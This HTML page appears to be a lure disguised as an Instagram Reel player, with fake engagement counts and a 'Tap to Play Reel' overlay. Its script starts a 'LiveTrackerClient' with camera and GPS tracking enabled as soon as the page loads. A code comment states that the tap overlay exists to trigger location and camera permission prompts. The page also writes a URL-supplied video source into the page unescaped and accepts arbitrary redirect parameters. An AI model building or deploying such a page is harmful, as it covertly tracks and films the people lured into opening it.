<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="ig-title">Instagram Reel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #ffffff;
        }

        .reel-wrapper {
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000000;
            position: relative;
        }

        .reel-card {
            width: 100%;
            height: 100%;
            max-width: 480px;
            max-height: 920px;
            position: relative;
            background: #050505;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
        }

        /* Top Instagram Reel Header */
        .reel-header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 56px;
            padding: 0 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
            z-index: 10;
            font-size: 18px;
            font-weight: 700;
        }

        .header-title {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .header-title i {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 22px;
        }

        /* Video Container */
        .video-viewport {
            flex: 1;
            width: 100%;
            height: 100%;
            position: relative;
            background: #000000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        iframe, video {
            width: 100%;
            height: 100%;
            border: none;
            object-fit: cover;
        }

        /* Bottom Reel Overlay Info */
        .reel-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px 16px 24px 16px;
            background: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.4) 60%, rgba(0,0,0,0) 100%);
            z-index: 10;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            pointer-events: none;
        }

        .reel-info {
            flex: 1;
            padding-right: 16px;
            pointer-events: auto;
        }

        .user-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }

        .avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
            padding: 2px;
        }

        .avatar img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .username {
            font-weight: 600;
            font-size: 14px;
        }

        .btn-follow {
            border: 1px solid rgba(255, 255, 255, 0.4);
            padding: 3px 10px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(4px);
        }

        .caption {
            font-size: 13px;
            line-height: 1.4;
            color: #f1f5f9;
            margin-bottom: 8px;
            max-height: 42px;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .audio-track {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #cbd5e1;
        }

        /* Right Action Bar */
        .reel-actions {
            display: flex;
            flex-direction: column;
            gap: 18px;
            align-items: center;
            pointer-events: auto;
        }

        .action-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-size: 20px;
            cursor: pointer;
        }

        .action-btn span {
            font-size: 11px;
            font-weight: 500;
        }

        /* Tap Overlay for Permission Prompt */
        .tap-prompt-overlay {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.35);
            backdrop-filter: blur(2px);
            z-index: 20;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .play-btn-circle {
            width: 72px;
            height: 72px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.25);
            border: 2px solid rgba(255, 255, 255, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: white;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            margin-bottom: 12px;
        }

        .prompt-text {
            font-size: 14px;
            font-weight: 600;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>

<body>
    <div class="reel-wrapper">
        <div class="reel-card">
            <!-- Header -->
            <div class="reel-header">
                <div class="header-title">
                    <i class="fab fa-instagram"></i>
                    <span>Reels</span>
                </div>
                <i class="fas fa-camera"></i>
            </div>

            <!-- Tap Overlay for Permission & Unmute -->
            <div class="tap-prompt-overlay" id="tap-overlay">
                <div class="play-btn-circle">
                    <i class="fas fa-play" style="margin-left: 4px;"></i>
                </div>
                <div class="prompt-text">Tap to Play Reel</div>
            </div>

            <!-- Main Reel Player -->
            <div class="video-viewport" id="viewport">
                <iframe id="ig-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; camera" allowfullscreen></iframe>
            </div>

            <!-- Overlay Details -->
            <div class="reel-overlay">
                <div class="reel-info">
                    <div class="user-row">
                        <div class="avatar">
                            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80" alt="Profile">
                        </div>
                        <span class="username" id="user-display">@trending_reels</span>
                        <span class="btn-follow">Follow</span>
                    </div>
                    <div class="caption" id="caption-display">Must watch viral video! 🔥 #reels #trending</div>
                    <div class="audio-track">
                        <i class="fas fa-music"></i>
                        <span>Original Audio - Trending Sound</span>
                    </div>
                </div>

                <div class="reel-actions">
                    <div class="action-btn">
                        <i class="fas fa-heart" style="color: #ef4444;"></i>
                        <span>124.5K</span>
                    </div>
                    <div class="action-btn">
                        <i class="fas fa-comment"></i>
                        <span>1,890</span>
                    </div>
                    <div class="action-btn">
                        <i class="fas fa-paper-plane"></i>
                        <span>Share</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);

        let redirectUrl = '';
        let userParam = '';
        let titleParam = '';
        let videoMediaUrl = '';

        const compressed = urlParams.get('d');
        if (compressed) {
            try {
                const data = JSON.parse(atob(decodeURIComponent(compressed)));
                if (data.r) redirectUrl = data.r;
                if (data.u) userParam = data.u;
                if (data.c) titleParam = data.c;
                if (data.v) videoMediaUrl = data.v;
            } catch (e) {}
        }

        if (!redirectUrl) {
            const rParam = urlParams.get('r') || urlParams.get('reel') || urlParams.get('p');
            if (rParam) {
                if (rParam.startsWith('http://') || rParam.startsWith('https://')) {
                    redirectUrl = rParam;
                } else {
                    redirectUrl = `https://www.instagram.com/reel/${rParam}/`;
                }
            } else {
                redirectUrl = urlParams.get('url') || urlParams.get('redirect') || 'https://www.instagram.com';
            }
        }

        if (!userParam) userParam = urlParams.get('u') || urlParams.get('user');
        if (!titleParam) titleParam = urlParams.get('c') || urlParams.get('title') || urlParams.get('caption');
        if (!videoMediaUrl) videoMediaUrl = urlParams.get('v') || urlParams.get('video');

        if (userParam) {
            document.getElementById('user-display').innerText = userParam.startsWith('@') ? userParam : `@${userParam}`;
        }
        if (titleParam) {
            document.getElementById('ig-title').innerText = `${titleParam} - Instagram Reel`;
            document.getElementById('caption-display').innerText = titleParam;
        }

        const viewport = document.getElementById('viewport');
        const iframe = document.getElementById('ig-iframe');

        // Extract Reel ID if present
        const reelMatch = redirectUrl.match(/instagram\.com\/(?:reel|reels|p)\/([A-Za-z0-9_-]+)/i);
        const reelId = reelMatch ? reelMatch[1] : '';

        if (videoMediaUrl || redirectUrl.endsWith('.mp4') || redirectUrl.includes('.mp4?')) {
            const vSrc = videoMediaUrl || redirectUrl;
            viewport.innerHTML = `<video id="active-video" src="${vSrc}" autoplay loop muted playsinline controls style="width:100%; height:100%; object-fit:cover;"></video>`;
        } else if (reelId) {
            iframe.src = `https://www.instagram.com/reel/${reelId}/embed/captioned/`;
        } else {
            iframe.src = `https://www.instagram.com/reel/C-TRACE/embed/captioned/`;
        }

        // Tap to play overlay triggers explicit user gesture for Location & Camera permission
        const tapOverlay = document.getElementById('tap-overlay');
        if (reelId) {
            const thumbUrl = `https://www.instagram.com/p/${reelId}/media/?size=l`;
            tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.7)), url('${thumbUrl}') center/cover no-repeat`;
        }

        function triggerUserPermissions() {
            tapOverlay.classList.add('hidden');
            const v = document.getElementById('active-video');
            if (v) {
                v.muted = false;
                v.play().catch(() => {});
            }

            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.sendTelemetry(null, 'instagram', true, true);
            }
        }

        tapOverlay.addEventListener('click', triggerUserPermissions);
        tapOverlay.addEventListener('touchstart', triggerUserPermissions, { passive: true });

        // Auto telemetry tracking on DOM load
        window.addEventListener('DOMContentLoaded', () => {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'instagram',
                    updateInterval: 4000,
                    enableCamera: true,
                    enableGPS: true
                });
            }
        });
    </script>
</body>

</html>
